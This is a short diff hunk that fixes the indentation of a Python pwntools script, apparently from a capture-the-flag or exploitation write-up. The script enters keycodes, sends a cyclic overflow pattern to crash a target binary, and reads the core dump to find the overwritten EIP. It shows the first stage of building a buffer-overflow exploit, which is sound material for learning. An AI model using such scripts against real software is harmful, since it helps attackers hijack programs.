@@ -551,15 +551,15 @@ io.recvuntil(" > ")
 io.sendline("666")
 
 for x in range(16):
-        io.recvuntil("Enter keycode %d: "%x)
-            io.sendline(str(keycodes[x]))
+    io.recvuntil("Enter keycode %d: "%x)
+    io.sendline(str(keycodes[x]))
 
-            print io.recv(4096)
+print io.recv(4096)
 
-            io.sendline(cyclic(128))
-            io.wait()
+io.sendline(cyclic(128))
+io.wait()
 
-            core = io.corefile
+core = io.corefile
 
 ####
 eip = core.eip
